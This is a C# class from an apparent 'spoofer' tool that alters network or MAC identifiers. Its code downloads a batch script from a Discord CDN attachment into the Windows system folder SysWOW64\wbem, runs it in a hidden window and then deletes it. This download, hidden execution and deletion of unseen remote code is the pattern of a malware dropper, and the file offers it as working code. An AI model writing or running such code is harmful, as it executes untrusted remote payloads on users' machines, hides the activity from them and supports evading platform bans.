using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace AedernSpoofer.Classes.Spoofing
{
    class NtwSpoof
    {
        public NtwSpoof()
        {
            DownloadRequirments();
            Process process = new Process();
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat";
            process.Start();
            process.WaitForExit();
            File.Delete("C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
        }

        public void DownloadRequirments()
        {
            WebClient webClient = new WebClient();
            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
            webClient.Proxy = null;
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/854451324413411331/854454779480899594/Mac.Oblivion.bat", "C:\\Windows\\SysWOW64\\wbem\\Mac.Oblivion.bat");
        }
    }
}
